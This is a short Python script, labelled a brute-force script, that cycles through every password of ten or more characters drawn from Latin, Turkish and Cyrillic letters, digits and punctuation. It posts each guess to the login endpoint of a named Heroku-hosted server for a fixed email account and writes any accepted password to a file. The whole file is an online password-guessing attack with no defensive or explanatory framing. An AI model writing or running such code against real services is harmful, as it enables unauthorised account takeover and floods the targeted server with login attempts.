"""
Brute-force script
"""
import itertools
import os
import string
import sys
import requests


def main():
    """
    Main function
    :return:
    """
    start_char = sys.argv[1]

    password_length = 10
    min_length = 10

    turkish = "çğıöşüÇĞİÖŞÜ"
    cyrillic_upper = "".join(chr(cp) for cp in range(0x0410, 0x042F + 1))
    cyrillic_lower = "".join(chr(cp) for cp in range(0x0430, 0x044F + 1))
    cyrillic = cyrillic_upper + cyrillic_lower
    chars = string.ascii_letters + string.digits + string.punctuation + turkish + cyrillic

    index = chars.index(start_char)
    rotated = chars[index:] + chars[:index]
    session = requests.Session()

    while True:
        for length in range(min_length - 1, password_length):
            for first_char in rotated:
                for rest in itertools.product(chars, repeat=length):
                    if not os.path.exists("pwd.txt"):
                        try:
                            combination = first_char + "".join(rest)
                            payload = {
                                "email": "test@easy.ch",
                                "password": combination,
                            }
                            response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login",
                                                    json=payload, timeout=5)
                            print(combination, response.status_code)
                            if response.ok:
                                print("Password: " + combination)
                                with open("pwd.txt", "w") as f:
                                    f.write(combination)
                                break
                        except Exception as e:
                            print(e)
                    else:
                        sys.exit()
        password_length += 1


if __name__ == "__main__":
    main()
